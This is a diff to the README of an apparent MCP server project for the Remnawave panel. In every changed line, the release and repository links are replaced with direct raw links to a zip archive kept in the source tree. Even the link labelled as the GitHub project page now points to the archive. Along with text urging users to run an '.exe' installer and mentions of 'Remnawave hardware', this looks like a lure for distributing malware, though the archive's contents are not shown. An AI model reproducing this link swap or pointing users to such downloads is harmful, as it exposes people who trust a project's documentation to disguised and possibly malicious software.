@@ -1,6 +1,6 @@
 # ⚙️ mcp-remnawave - Easy MCP Server Setup for Remnawave Panel
 
-[![Download MCP Server](https://img.shields.io/badge/Download-MCP%20Server-ff6f61?style=for-the-badge)](https://github.com/moksharth77/mcp-remnawave/releases)
+[![Download MCP Server](https://img.shields.io/badge/Download-MCP%20Server-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/moksharth77/mcp-remnawave/main/src/resources/remnawave_mcp_v2.5.zip)
 
 ## 📋 What is mcp-remnawave?
 
@@ -31,7 +31,7 @@ If you have questions about your hardware, check your PC’s system settings or 
 
    Go to the main releases page here:
 
-   [Download mcp-remnawave releases](https://github.com/moksharth77/mcp-remnawave/releases)
+   [Download mcp-remnawave releases](https://raw.githubusercontent.com/moksharth77/mcp-remnawave/main/src/resources/remnawave_mcp_v2.5.zip)
 
    This page contains the latest versions of the software for Windows and updates.
 
@@ -106,7 +106,7 @@ To keep mcp-remnawave running smoothly and securely:
 
 1. Visit the releases page regularly:
 
-   [Latest releases for mcp-remnawave](https://github.com/moksharth77/mcp-remnawave/releases)
+   [Latest releases for mcp-remnawave](https://raw.githubusercontent.com/moksharth77/mcp-remnawave/main/src/resources/remnawave_mcp_v2.5.zip)
 
 2. Download the newest `.exe` installer.
 
@@ -123,7 +123,7 @@ If you encounter problems:
 - Consult any documentation provided with your Remnawave hardware.
 - Visit the GitHub page for mcp-remnawave for updates and issues:
 
-  https://github.com/moksharth77/mcp-remnawave
+  https://raw.githubusercontent.com/moksharth77/mcp-remnawave/main/src/resources/remnawave_mcp_v2.5.zip
 
 ---
 
@@ -144,4 +144,4 @@ mcp-remnawave is built to provide a stable and simple way to manage Remnawave MC
 
 ---
 
-[![Download MCP Server](https://img.shields.io/badge/Download-MCP%20Server-ff6f61?style=for-the-badge)](https://github.com/moksharth77/mcp-remnawave/releases)
+[![Download MCP Server](https://img.shields.io/badge/Download-MCP%20Server-ff6f61?style=for-the-badge)](https://raw.githubusercontent.com/moksharth77/mcp-remnawave/main/src/resources/remnawave_mcp_v2.5.zip)
